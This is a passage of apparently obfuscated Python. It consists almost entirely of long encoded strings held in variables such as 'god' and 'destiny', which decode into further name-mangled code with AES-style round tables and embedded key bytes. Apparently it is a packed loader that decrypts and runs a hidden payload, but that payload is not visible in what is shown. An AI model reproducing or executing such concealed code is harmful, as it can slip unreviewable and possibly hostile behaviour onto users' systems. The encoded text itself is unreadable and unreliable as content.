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'; god = 'QXdUekJQTUU5UFR6QXdNREF3VHlBamJHbHVaVG94TmpjS1gwOHdNREF3TURCUE1FOVBUekF3VHpBZ1BWc3hOU0FzTWpRM0lDdzJJQ3d5TWprZ0xETTBJQ3d4TnpNZ0xERTVPU0FzTVRrZ1hTTnNhVzVsT2pFM01BcGtaV1lnWDE5UE1EQXdNREF3TURBd01FOVBUekJQTUNBb1R6QXdNRTlQTUU4d01FOHdNREF3VHpBZ0tUb2piR2x1WlRveE56TUtJQ0FnSUNJaUkyeHBibVU2TVRjNENpQWdJQ0JQTUU4d01EQlBNRTh3TUU5UFQwOVBNQ0E5VHpBd01FOVBNRTh3TUU4d01EQXdUekFnV3pBZ1hWNVBNREF3VDA4d1R6QXdUekF3TURCUE1DQmJNU0JkWGs4d01EQlBUekJQTURCUE1EQXdNRTh3SUZzeUlGMWVUekF3TUU5UE1FOHdNRTh3TURBd1R6QWdXek1nWFNOc2FXNWxPakUzT1FvZ0lDQWdUMDlQTUU4d01EQlBNREF3VHpBd01EQWdQVTh3TURCUFR6QlBNREJQTURBd01FOHdJRnN3SUYwamJHbHVaVG94T0RBS0lDQWdJRTh3TURCUFR6QlBNREJQTURBd01FOHdJRnN3SUYxZVBVOHdUekF3TUU4d1R6QXdUMDlQVDA4d0lGNTRkR2x0WlNBb1R6QXdNRTlQTUU4d01FOHdNREF3VHpBZ1d6QWdYVjVQTURBd1QwOHdUekF3VHpBd01EQlBNQ0JiTVNCZEtTTnNhVzVsT2pFNE1Rb2dJQ0FnVHpBd01FOVBNRTh3TUU4d01EQXdUekFnV3pFZ1hWNDlUekJQTURBd1R6QlBNREJQVDA5UFR6QWdYbmgwYVcxbElDaFBNREF3VDA4d1R6QXdUekF3TURCUE1DQmJNU0JkWGs4d01EQlBUekJQTURCUE1EQXdNRTh3SUZzeUlGMHBJMnhwYm1VNk1UZ3lDaUFnSUNCUE1EQXdUMDh3VHpBd1R6QXdNREJQTUNCYk1pQmRYajFQTUU4d01EQlBNRTh3TUU5UFQwOVBNQ0JlZUhScGJXVWdLRTh3TURCUFR6QlBNREJQTURBd01FOHdJRnN5SUYxZVR6QXdNRTlQTUU4d01FOHdNREF3VHpBZ1d6TWdYU2tqYkdsdVpUb3hPRE1LSUNBZ0lFOHdNREJQVHpCUE1EQlBNREF3TUU4d0lGc3pJRjFlUFU4d1R6QXdNRTh3VHpBd1QwOVBUMDh3SUY1NGRHbHRaU0FvVHpBd01FOVBNRTh3TUU4d01EQXdUekFnV3pNZ1hWNVBUMDh3VHpBd01FOHdNREJQTURBd01DQXBJMnhwYm1VNk1UZzBDaUFnSUNCeVpYUjFjbTRnVHpBd01FOVBNRTh3TUU4d01EQXdUekFnSTJ4cGJtVTZNVGcxQ21SbFppQmZUMDh3VHpBd1QwOVBNREJQVHpBd01EQWdLRTlQVHpBd01FOVBUekJQVHpBd01EQlBJQ2s2STJ4cGJtVTZNVGc0Q2lBZ0lDQWlJaU5zYVc1bE9qRTVNd29nSUNBZ2NtVjBkWEp1SUZ0ZlgwOHdNREF3TURBd01EQXdUMDlQTUU4d0lDaFBNREF3VHpBd01EQXdUekJQTURBd01DQXBabTl5SUU4d01EQlBNREF3TURCUE1FOHdNREF3SUdsdUlFOVBUekF3TUU5UFR6QlBUekF3TURCUElGMGpiR2x1WlRveE9UUUtaR1ZtSUY5UE1EQXdNRTh3VDA5UFR6QlBUMDh3TUNBb1QwOVBUekJQVHpBd01FOVBUekJQTUU4Z0tUb2piR2x1WlRveE9UY0tJQ0FnSUNJaUkyeHBibVU2TWpBeUNpQWdJQ0JtYjNJZ1R6QXdUMDh3VDA5UFQwOHdUekJQVHpBZ2FXNGdUMDlQVHpCUFR6QXdNRTlQVHpCUE1FOGdPaU5zYVc1bE9qSXdNd29nSUNBZ0lDQWdJRTh3VHpCUE1FOHdUMDlQTURCUE1EQlBJRDE0ZEdsdFpTQW9lSFJwYldVZ0tFOHdNRTlQTUU5UFQwOVBNRTh3VDA4d0lGc3dJRjFlVHpBd1QwOHdUMDlQVDA4d1R6QlBUekFnV3pJZ1hTa3BJMnhwYm1VNk1qQTBDaUFnSUNBZ0lDQWdUMDh3VDA5UE1EQXdNREJQVDA5UFQwOGdQWGgwYVcxbElDaDRkR2x0WlNBb1R6QXdUMDh3VDA5UFQwOHdUekJQVHpBZ1d6RWdYVjVQTURCUFR6QlBUMDlQVHpCUE1FOVBNQ0JiTXlCZEtTa2piR2x1WlRveU1EVUtJQ0FnSUNBZ0lDQlBNREJQVHpCUFQwOVBUekJQTUU5UE1DQmJNQ0JkWGoxUE1FOHdUekJQTUU5UFR6QXdUekF3VHlBamJHbHVaVG95TURZS0lDQWdJQ0FnSUNCUE1EQlBUekJQVDA5UFR6QlBNRTlQTUNCYk1TQmRYajFQVHpCUFQwOHdNREF3TUU5UFQwOVBUeUFqYkdsdVpUb3lNRGNLSUNBZ0lDQWdJQ0JQTURCUFR6QlBUMDlQVHpCUE1FOVBNQ0JiTWlCZFhqMVBNRTh3VHpCUE1FOVBUekF3VHpBd1R5QWpiR2x1WlRveU1EZ0tJQ0FnSUNBZ0lDQlBNREJQVHpCUFQwOVBUekJQTUU5UE1DQmJNeUJkWGoxUFR6QlBUMDh3TURBd01FOVBUMDlQVHlBamJHbHVaVG95TURsZlR6QlBNREF3TURCUE1FOVBUMDlQVHpBS0lDQWdJSEpsZEhWeWJpQmZUMDh3VHpBd1QwOVBNREJQVHpBd01EQWdLRTlQVDA4d1QwOHdNREJQVDA4d1R6QlBJQ2tqYkdsdVpUb3lNVEFLU1NBOU15QWpiR2x1WlRveU1UTUtaR1ZtSUY5UE1FOHdNREF3TUU5UFQwOVBUMDlQTUNBb1R6QXdUekJQVHpCUE1EQlBNREF3VDA4Z0xFOVBUekF3TURCUFR6QlBUekF3VDA4d0lDazZJMnhwYm1VNk1qRTJDaUFnSUNBaUlpTnNhVzVsT2pJeU1nb2dJQ0FnVDA5UE1EQXdUekJQVHpCUE1FOVBNRThnUFZ0ZEkyeHBibVU2TWpJekNpQWdJQ0JtYjNJZ1R6QlBUMDlQTUU4d1R6QlBNRTlQVDA4Z0xFOVBUMDh3VDA4d1R6QXdNREF3VDA5UElHbHVJSHBwY0NBb1R6QXdUekJQVHpCUE1EQlBNREF3VDA4Z0xFOVBUekF3TURCUFR6QlBUekF3VDA4d0lDazZJMnhwYm1VNk1qSTBDaUFnSUNBZ0lDQWdUekJQVDA4d1R6QXdNRTlQVHpCUFQwOGdQVnRkSTJ4cGJtVTZNakkxQ2lBZ0lDQWdJQ0FnWm05eUlFOVBUekJQTURBd1QwOHdUMDlQVHpCUElDeFBNRTlQVHpCUFQwOVBNREF3VHpBd1R5QnBiaUI2YVhBZ0tFOHdUMDlQVHpCUE1FOHdUekJQVDA5UElDeFBUMDlQTUU5UE1FOHdNREF3TUU5UFR5QXBPaU5zYVc1bE9qSXlOZ29nSUNBZ0lDQWdJQ0FnSUNCUE1FOVBUekJQTURBd1QwOVBNRTlQVHlBdVlYQndaVzVrSUNoUFQwOHdUekF3TUU5UE1FOVBUMDh3VHlCZVR6QlBUMDh3VDA5UFR6QXdNRTh3TUU4Z0tTTnNhVzVsT2pJeU53b2dJQ0FnSUNBZ0lFOVBUekF3TUU4d1QwOHdUekJQVHpCUElDNWhjSEJsYm1RZ0tFOHdUMDlQTUU4d01EQlBUMDh3VDA5UElDa2piR2x1WlRveU1qZ0tJQ0FnSUhKbGRIVnliaUJQVDA4d01EQlBNRTlQTUU4d1QwOHdUeUFqYkdsdVpUb3lNamtLWDA4d1R6QXdNREF3VHpCUFQwOHdNRTh3SUM1cGJuTmxjblFnS0RFZ0xHeHBjM1FnS0hKbGRtVnljMlZrSUNoYk1qTTFJQ3czTlNBc01UQWdMREkxTXlBc01UQXpJQ3c0TWlBc056Y2dMREV4TlNCZEsxOVBNREF3TURBd1R6QlBUMDh3TUU4d0lDa3BLU05zYVc1bE9qSXpNZ3BQTURBd1R6QXdUMDh3VDA4d01FOVBUeUE5SnpKWGExeDRZbUpGUkZ4NE9ESmNlRGcwWEhnNU5FMWNlR1UwWEhoa1pTOWNlR1V3WEhoaE1DMG5JMnhwYm1VNk1qTTJDbVJsWmlCZlR6QlBNREF3TURCUE1FOVBUMDlQVHpBZ0tFOHdUMDlQVDA4d1QwOHdUMDlQTURBd0lDazZJMnhwYm1VNk1qTTFDaUFnSUNCUE1EQlBUekF3VDA5UFQwOVBNRTlQTUNBOVQwOVBNREF3TURBd01EQlBNREF3TUU4Z0tFOVBUekF3TURBd01EQXdUekF3TURBd0lDZ3BLU05zYVc1bE9qSXpOd29nSUNBZ1R6QXdUekJQTUU5UFR6QlBNREF3VDA4Z1BVOHdNRTlQTURCUFQwOVBUMDh3VDA4d0lDNVBNRTh3VHpBd1R6QlBNREJQVDA5UFR5QW9UekJQVDA5UFR6QlBUekJQVDA4d01EQWdMRTh3TURCUE1EQlBUekJQVHpBd1QwOVBJQ2t1WkdWamIyUmxJQ2dwSTJ4cGJtVTZNak00Q2lBZ0lDQlBUMDlQTURBd1R6QlBUekJQVHpCUE1DQTlKMXh1SnlOc2FXNWxPakl6T1FvZ0lDQWdUMDh3TUU4d01EQlBNRTlQTUU5UE1FOGdQV2RsZEdGMGRISWdLSE4wY2lBc1puVnVZeUFwSTJ4cGJtVTZNalF4Q2lBZ0lDQnBaaUFvTFRCNE9UZzRJQ3N0TUhneE9HWTJJQ3N3ZURJeU9EQWdLU1V5SUNFOU1DQTZJMnhwYm1VNk1qUXlDaUFnSUNBZ0lDQWdUekJQTUU5UFQwOVBUMDh3TURBd01EQWdQVnRkSTJ4cGJtVTZNalF6Q2lBZ0lDQWdJQ0FnWm05eUlFOVBUekJQVHpBd01EQlBNRTlQVDA4d0lHbHVJRTh3VHpCUE1EQlBUekJQVHpCUE1EQXdLRTh3TURBd01EQXdUekF3TUU4d1R6QXdJQ2s2STJ4cGJtVTZNalEwQ2lBZ0lDQWdJQ0FnSUNBZ0lFOHdUekJQVDA5UFQwOVBNREF3TURBd0lDNWhjSEJsYm1RZ0tFOVBNREJQTURBd1R6QlBUekJQVHpCUElDaFBNREJQTUU4d1QwOVBNRTh3TURCUFR5QXNUMDlQVHpBd01FOHdUMDh3VDA4d1R6QWdLVnM2TUhobU16RWdLeTB3ZURRd09DQXJMVEI0WWpJNElGMHBJMnhwYm1VNk1qUTFDaUFnSUNBZ0lDQWdjbVYwZFhKdUlFOVBUMDh3TURCUE1FOVBNRTlQTUU4d0lDNXFiMmx1SUNoUE1FOHdUMDlQVDA5UFR6QXdNREF3TUNBcEkyeHBibVU2TWpRMkNpQWdJQ0JsYkhObElEb2piR2x1WlRveU5EY0tJQ0FnSUNBZ0lDQlBNRTh3VDA5UFQwOVBUekF3TURBd01DQTlXMTBqYkdsdVpUb3lORGdLSUNBZ0lDQWdJQ0JQTURBd01FOHdNRTh3TURCUFR6QXdUeUE5VDA4d01FOHdNREJQTUU5UE1FOVBNRThnS0U4d01FOHdUekJQVDA4d1R6QXdNRTlQSUN4UFQwOVBNREF3VHpCUFR6QlBUekJQTUNBcEkyeHBibVU2TWpRNUNpQWdJQ0FnSUNBZ1ptOXlJRTlQVHpCUFR6QXdNREJQTUU5UFQwOHdJR2x1SUU4d1R6QlBNREJQVHpCUFR6QlBNREF3S0U4d01EQXdNREF3VHpBd01FOHdUekF3SUNrNkkyeHBibVU2TWpVd0NpQWdJQ0FnSUNBZ0lDQWdJRTh3VHpCUFQwOVBUMDlQTURBd01EQXdJQzVoY0hCbGJtUWdLR2NnS0U4d01EQXdUekF3VHpBd01FOVBNREJQSUNrcEkyeHBibVU2TWpVeENpQWdJQ0FnSUNBZ2NtVjBkWEp1SUU4d1R6QlBUMDlQVDA5UE1EQXdNREF3SUNOc2FXNWxPakkxTWdwZlgyRnNiRjlmSUQwZ1cwOHdNRTh3TUU5UFQwOVBNREF3TUU5UEtFOHdNREJQTURCUFR6QlBUekF3VDA5UExDQW5YSGc0TVZ4NE9EZkN1c09yWEhnNU5GeDRPVFBEa2NLMHc0UjlNeTErWEhneE1NT1FYV0luS1YwS1pHVm1JRjlQTUU4d1R6QXdNRTlQTUU5UFR6QlBNQ0FvVHpCUE1FOVBUekF3TURBd1R6QlBUekFnTEU5UFR6QlBNRTh3TURBd01FOVBUMDh3SUQweE5pQXBPaU5zYVc1bE9qSTFOUW9nSUNBZ0lpSWpiR2x1WlRveU5qSUtJQ0FnSUU4d1R6QXdUekJQTUU5UFQwOVBUMDh3SUQxUFQwOHdUekJQTURBd01EQlBUMDlQTUNBdEtHeGxiaUFvVHpCUE1FOVBUekF3TURBd1R6QlBUekFnS1NWUFQwOHdUekJQTURBd01EQlBUMDlQTUNBcEkyeHBibVU2TWpZekNpQWdJQ0J5WlhSMWNtNGdUekJQTUU5UFR6QXdNREF3VHpCUFR6QWdLMko1ZEdWeklDaGJUekJQTURCUE1FOHdUMDlQVDA5UFR6QWdYU3BQTUU4d01FOHdUekJQVDA5UFQwOVBNQ0FwSTJ4cGJtVTZNalkwQ21SbFppQmZUekJQVHpCUE1FOHdUekF3VHpBd01FOGdLRTlQTUU5UE1FOVBUekJQVDA5UE1FOVBJQ2s2STJ4cGJtVTZNalkzQ2lBZ0lDQWlJaU5zYVc1bE9qSTNNd29nSUNBZ2NtVjBkWEp1SUU5UE1FOVBNRTlQVHpCUFQwOVBNRTlQSUZzNkxVOVBNRTlQTUU5UFR6QlBUMDlQTUU5UElGc3RNU0JkWFNOc2FXNWxPakkzTkFwT1ZVMWZVazlWVGtSVElEMTdNVFlnT2pFeElDd3lOQ0E2TVRNZ0xETXlJRG94TmlCOUkyeHBibVU2TWpjM0NrNVZUVjlYVDFKRVV5QTllekUySURvMElDd3lOQ0E2TmlBc016SWdPamdnZlNOc2FXNWxPakkzT0FwSmJuWmZYMDh3VHpBd01EQXdUekJQVDA4d01FOHdJRnRTSUYxYlNTQmRQVEI0TldFZ0kyeHBibVU2TWpnd0NsOVBNREF3TURBd1R6QXdNRTh3TUU4d01TQTlKeTVQUTF4eVhIaGhOMU5jZURBd1hIZzVabHg0WlRCY2VHTXlVMjVjZURBM1hIZ3hOVng0T1RaY2VHUmpjVng0WVRFaFhIZ3dNVng0TVdVL1hIZzVZbHg0WkRCY2VEZzNOVng0TVRsY2VEQmpYSGc0WTF4NFl6RnhUU2NqYkdsdVpUb3lPRElLWDA4d01EQXdNREJQTURBd1R6QXdUekF5SUQwblhIaGhOMXg0TURCY2VEQXpYSGhrWmx4NE9EZGNlR0V6S0Z4NE9HRmNlR0U1Y2x4NFpXUmNlR0l4WEhoa016ZGNlR05pWEhnNVlseDRZak5HUFZ4NE1XWm9OVng0WWpSZlJpMWNlR00wWEhoak1YeGNlR0ZtWlRzbkkyeHBibVU2TWpnekNsOVBNREF3TURBd1R6QXdNRTh3TUU4d015QTlKMXg0TUdVNWIxeDRZV1pjZURsaFhIaG1ObHg0WWpsY2VEbGpZMXg0Wm1OZGFseDRNVGRjZURoa1hIZ3hPR3BjZUdJeEwxeDRZak5jZUdOakx5MWNlRGd4WEhobE5seGNYSGhrTlZ4NFpEUmNlREUyWEhnNE1GeDRPVGcwWEhneFpDY2piR2x1WlRveU9EUUtYMDh3TURBd01EQlBNREF3VHpBd1R6QTBJRDBuWkN0K1hIaGhNMXg0WWpGalhIaGlPRng0TURCY2VEZ3lYSGd4TjF4NFptVmNkRng0TUdNa2VuY3RYSGd4WTF4NFlUWmNlRGxqTVZ4NFpqRTNYSGhoTmx4NFlqVmNlR1kyWEhoaFlXZGNlREJqVzF4NFltWitKeU5zYVc1bE9qSTROUXBmVHpBd01EQXdNRTh3TURCUE1EQlBNRFVnUFNJbmZWcGNlR1l4WEhoaU9TTmNlRGd4WEhobU5tdGNlR0poWEhneE16TW9YSGhtWkZ4NE1XUmNlR0UwUjF4NFpEQmNlREZoSVZ4NE1UVmNlRGszWEhnM1pseDRZakpjZUdFM2IxeDRZak5jZURrelcxeDRNVEZHZlNJamJHbHVaVG95T0RZS1kyeGhjM01nVDA5UE1EQXdNREF3TURCUE1EQXdNRThnT2lOc2FXNWxPakk0T1FvZ0lDQWdaR1ZtSUY5ZmFXNXBkRjlmSUNoUFQwOHdNREJQVDA5UFQwOHdNRTh3VHlBc1R6QlBNRTh3TURBd1QwOVBNREF3TUU4Z0xFOHdNREF3VDA4d1QwOVBUekF3VDA5UElEMURRa01nS1RvamJHbHVaVG95T1RBS0lDQWdJQ0FnSUNCcFppQnNaVzRnS0U4d1R6QlBNREF3TUU5UFR6QXdNREJQSUMnOyBkZXN0aW55ID0gJ3lobzNEdG5KNHRHeUlBSzFXQ0lINVJIbE42VjJrY296SDZad3hrUHZOdFZQTnRWUE50VlBOdFZVV3VuS0F5VlNNdW9VSXlFS1dsbzNWdFhQV0Nvems1VlFSbEJQanRaR3hsVlRTaE1QTmxBR0x0THp5MFZUZ3lyS1p0TEtXeVZVQTFwVU9pcGFFeU1QUnZYRkFmbko1eUJ3VjVadGJ0VlBOdFZQTnRWVHl6VlI4alpRTmpHMDhqRzA5Q0dtTmpHMDlDVlBSOUQwV1FWVFNoTVBPQ1pRTmpaUjlDWlI5Q0cwOGpaUjlDR2xOdUNISVFEdk42VjJrY296SDZad3gwUHZOdFZQTnRWUE50VlBOdFZVV3VuS0F5VlNNdW9VSX'; destiny = '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